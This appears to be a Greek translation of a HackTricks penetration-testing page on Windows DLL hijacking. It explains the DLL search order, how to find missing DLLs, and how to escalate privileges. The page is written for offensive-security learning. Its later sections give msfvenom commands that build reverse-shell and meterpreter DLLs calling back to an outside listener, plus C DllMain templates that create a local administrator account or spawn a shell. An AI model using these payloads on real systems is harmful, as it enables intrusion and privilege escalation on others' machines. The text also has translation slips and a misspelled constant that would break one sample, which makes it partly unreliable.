# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## Basic Information

Η εκμετάλλευση DLL Hijacking περιλαμβάνει την παραποίηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει μια κακόβουλη DLL. Αυτός ο όρος περιλαμβάνει αρκετές τακτικές όπως **DLL Spoofing, Injection, και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη επιμονής και, λιγότερο συχνά, κλιμάκωση δικαιωμάτων. Παρά την εστίαση στην κλιμάκωση εδώ, η μέθοδος της εκμετάλλευσης παραμένει συνεπής σε όλους τους στόχους.

### Common Techniques

Διάφορες μέθοδοι χρησιμοποιούνται για την εκμετάλλευση DLL, καθεμία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση μιας γνήσιας DLL με μια κακόβουλη, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα της αρχικής DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση της κακόβουλης DLL σε μια διαδρομή αναζήτησης πριν από την νόμιμη, εκμεταλλευόμενη το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία μιας κακόβουλης DLL για να φορτωθεί από μια εφαρμογή, νομίζοντας ότι είναι μια ανύπαρκτη απαιτούμενη DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το `%PATH%` ή τα αρχεία `.exe.manifest` / `.exe.local` για να κατευθυνθεί η εφαρμογή στην κακόβουλη DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση της νόμιμης DLL με μια κακόβουλη στο φάκελο WinSxS, μια μέθοδος που συχνά σχετίζεται με την πλευρική φόρτωση DLL.
6. **Relative Path DLL Hijacking**: Τοποθέτηση της κακόβουλης DLL σε έναν φάκελο που ελέγχεται από τον χρήστη με την αντιγραμμένη εφαρμογή, που μοιάζει με τις τεχνικές Binary Proxy Execution.

## Finding missing Dlls

Ο πιο κοινός τρόπος για να βρείτε ελλείπουσες DLL σε ένα σύστημα είναι να εκτελέσετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ορίζοντας** τους **ακόλουθους 2 φίλτρους**:

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

και να δείξετε μόνο τη **Δραστηριότητα Συστήματος Αρχείων**:

![](<../../images/image (314).png>)

Αν ψάχνετε για **ελλείπουσες dll γενικά** μπορείτε να **αφήσετε** αυτό να τρέχει για μερικά **δευτερόλεπτα**.\
Αν ψάχνετε για μια **ελλείπουσα dll μέσα σε μια συγκεκριμένη εκτελέσιμη** θα πρέπει να ορίσετε **ένα άλλο φίλτρο όπως "Process Name" "contains" "\<exec name>", να την εκτελέσετε και να σταματήσετε την καταγραφή γεγονότων**.

## Exploiting Missing Dlls

Για να κλιμακώσουμε δικαιώματα, η καλύτερη ευκαιρία που έχουμε είναι να μπορέσουμε να **γράψουμε μια dll που μια διαδικασία με δικαιώματα θα προσπαθήσει να φορτώσει** σε κάποιο από **τα μέρη όπου θα αναζητηθεί**. Επομένως, θα μπορέσουμε να **γράψουμε** μια dll σε έναν **φάκελο** όπου η **dll αναζητείται πριν** από τον φάκελο όπου βρίσκεται η **αρχική dll** (παράξενος περίπτωση), ή θα μπορέσουμε να **γράψουμε σε κάποιο φάκελο όπου η dll θα αναζητηθεί** και η αρχική **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Μέσα στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται οι DLL συγκεκριμένα.**

**Οι εφαρμογές των Windows** αναζητούν DLL ακολουθώντας ένα σύνολο **προκαθορισμένων διαδρομών αναζήτησης**, τηρώντας μια συγκεκριμένη ακολουθία. Το ζήτημα της εκμετάλλευσης DLL προκύπτει όταν μια επιβλαβής DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, διασφαλίζοντας ότι θα φορτωθεί πριν από την αυθεντική DLL. Μια λύση για να αποτραπεί αυτό είναι να διασφαλιστεί ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στις DLL που απαιτεί.

Μπορείτε να δείτε τη **σειρά αναζήτησης DLL σε 32-bit** συστήματα παρακάτω:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος συστήματος. Χρησιμοποιήστε τη [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) συνάρτηση για να αποκτήσετε τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο 16-bit κατάλογος συστήματος. Δεν υπάρχει συνάρτηση που να αποκτά τη διαδρομή αυτού του καταλόγου, αλλά αναζητείται. (_C:\Windows\System_)
4. Ο κατάλογος των Windows. Χρησιμοποιήστε τη [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) συνάρτηση για να αποκτήσετε τη διαδρομή αυτού του καταλόγου.
1. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει τη διαδρομή ανά εφαρμογή που καθορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό της διαδρομής αναζήτησης DLL.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη δυνατότητα, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι ενεργοποιημένη).

Αν η [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) συνάρτηση καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση αρχίζει στον κατάλογο του εκτελέσιμου μοντέλου που **φορτώνει η LoadLibraryEx**.

Τέλος, σημειώστε ότι **μια dll θα μπορούσε να φορτωθεί υποδεικνύοντας την απόλυτη διαδρομή αντί μόνο το όνομα**. Σε αυτή την περίπτωση, η dll θα **αναζητηθεί μόνο σε αυτή τη διαδρομή** (αν η dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως μόλις φορτώθηκαν με το όνομα).

Υπάρχουν άλλοι τρόποι για να τροποποιήσετε τις μεθόδους αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

#### Exceptions on dll search order from Windows docs

Ορισμένες εξαιρέσεις από τη стандартική σειρά αναζήτησης DLL σημειώνονται στην τεκμηρίωση των Windows:

- Όταν συναντηθεί μια **DLL που μοιράζεται το όνομά της με μία που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντίθετα, εκτελεί έναν έλεγχο για ανακατεύθυνση και ένα μανιφέστο πριν επιστρέψει στη DLL που ήδη βρίσκεται στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν διεξάγει αναζήτηση για τη DLL**.
- Σε περιπτώσεις όπου η DLL αναγνωρίζεται ως **γνωστή DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοση της γνωστής DLL, μαζί με οποιαδήποτε από τις εξαρτώμενες DLL της, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα με αυτές τις γνωστές DLL.
- Αν μια **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτές τις εξαρτώμενες DLL διεξάγεται σαν να υποδεικνύονταν μόνο με τα **ονόματα των μονάδων τους**, ανεξάρτητα από το αν η αρχική DLL αναγνωρίστηκε μέσω πλήρους διαδρομής.

### Escalating Privileges

**Απαιτήσεις**:

- Εντοπίστε μια διαδικασία που λειτουργεί ή θα λειτουργήσει με **διαφορετικά δικαιώματα** (οριζόντια ή πλευρική κίνηση), η οποία **λείπει μια DLL**.
- Διασφαλίστε ότι υπάρχει **δικαίωμα εγγραφής** για οποιονδήποτε **φάκελο** στον οποίο θα **αναζητηθεί η DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος της εκτελέσιμης ή ένας κατάλογος εντός της διαδρομής του συστήματος.

Ναι, οι απαιτήσεις είναι περίπλοκες να βρεθούν καθώς **κατά προεπιλογή είναι κάπως παράξενο να βρείτε μια εκτελέσιμη με δικαιώματα που να λείπει μια dll** και είναι ακόμη **πιο παράξενο να έχετε δικαιώματα εγγραφής σε έναν φάκελο διαδρομής συστήματος** (δεν μπορείτε κατά προεπιλογή). Αλλά, σε κακώς ρυθμισμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που έχετε τύχη και βρείτε τον εαυτό σας να πληροί τις απαιτήσεις, μπορείτε να ελέγξετε το έργο [UACME](https://github.com/hfiref0x/UACME). Ακόμη και αν ο **κύριος στόχος του έργου είναι η παράκαμψη του UAC**, μπορεί να βρείτε εκεί μια **PoC** ενός Dll hijaking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανώς αλλάζοντας απλώς τη διαδρομή του φακέλου όπου έχετε δικαιώματα εγγραφής).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου και τις εξαγωγές μιας dll με:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **καταχραστείτε το Dll Hijacking για να κερδίσετε δικαιώματα** με άδειες εγγραφής σε έναν **φάκελο System Path**, ελέγξτε:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε άδειες εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς θα ήταν να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις λειτουργίες που θα εισάγει το εκτελέσιμο από αυτό**. Ούτως ή άλλως, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [ανεβείτε από το Medium Integrity level σε High **(παρακάμπτοντας το UAC)**](../authentication-credentials-uac-and-efs.md#uac) ή από [**High Integrity σε SYSTEM**](./#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα για **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη dll hijacking που επικεντρώνεται στο dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κωδικούς dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με μη απαιτούμενες εξαγόμενες λειτουργίες**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένα **Dll proxy** είναι ένα Dll ικανό να **εκτελεί τον κακόβουλο κώδικά σας όταν φορτωθεί** αλλά και να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται** **αναμεταδίδοντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε στην πραγματικότητα να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και **να δημιουργήσετε ένα proxified dll** ή **να υποδείξετε το Dll** και **να δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Πάρε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργήστε έναν χρήστη (x86 δεν είδα μια x64 έκδοση):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σημειώστε ότι σε πολλές περιπτώσεις το Dll που θα συντάξετε πρέπει να **εξάγει πολλές συναρτήσεις** που θα φορτωθούν από τη διαδικασία του θύματος, αν αυτές οι συναρτήσεις δεν υπάρχουν, το **δυαδικό αρχείο δεν θα μπορέσει να τις φορτώσει** και η **εκμετάλλευση θα αποτύχει**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Αναφορές

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



{{#include ../../banners/hacktricks-training.md}}
